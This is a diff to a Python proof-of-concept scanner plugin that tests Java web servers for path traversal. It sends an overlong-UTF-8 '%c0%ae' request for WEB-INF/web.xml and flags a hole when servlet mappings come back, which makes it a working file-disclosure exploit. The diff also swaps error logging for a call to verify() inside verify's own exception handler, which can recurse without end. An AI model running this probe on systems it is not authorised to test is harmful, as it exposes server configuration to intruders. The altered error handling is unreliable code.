@@ -34,8 +34,10 @@ class Poc(ABPoc):
 
             hh = hackhttp.hackhttp()
             arg = self.target
+
             payload = arg + '/%c0%ae/WEB-INF/web.xml'
             code, head, res, err, _ = hh.http(payload)
+
 
             if code == 200 and '<servlet-mapping>' in res and '<servlet-name>' in res:
                 #security_hole('Arbitrarily file download: '+payload)
@@ -43,8 +45,7 @@ class Poc(ABPoc):
                     target=self.target, name=self.vuln.name))
 
         except Exception, e:
-            self.output.info('执行异常{}'.format(e))
-
+            self.verify()
     def exploit(self):
         self.verify()
 
